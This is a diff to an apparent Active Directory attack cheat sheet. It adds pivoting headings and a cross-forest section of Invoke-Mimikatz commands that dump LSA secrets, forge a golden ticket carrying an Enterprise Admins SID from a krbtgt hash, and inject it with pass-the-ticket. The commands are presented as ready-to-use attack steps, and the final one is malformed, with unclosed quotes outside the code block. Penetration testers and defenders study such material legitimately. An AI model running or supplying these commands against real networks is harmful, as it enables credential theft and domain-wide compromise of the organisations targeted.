@@ -29,6 +29,10 @@ it is the first version of this repo, many things will be added later, so stay t
   - [Brutforce AD Password]()
     - [Custom Username and Password wordlist](custom-username-and-password-wordlist)
   - [RID Cycling]()
+  - [Pivoting]()
+    - [SMB Pipes]()
+    - [SharpSocks]()
+    - [RDP Tunneling via DVC]()
   - [Persistence]()
     - [SIDHistory Injection]()
     - [AdminSDHolder & SDProp]()
@@ -191,6 +195,16 @@ mimikatz # !-
 
 ## Cross Forest Attacks :
 
+### Using KRBTGT hash :
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domaine.fun.local /sid:S-1-5-x-x-x-x /sids:S-1-5-x-x-x-x-519 /krbtgt:<hash> /ticket:C:\path\krb_tgt.kirbi"'
+```
+
+Invoke-Mimikatz -Command '"kerberos::ptt C:\path\krb_tgt.kirbi
+
+  
 ## Azure Active Directory :
 
 ### User Enumeration :
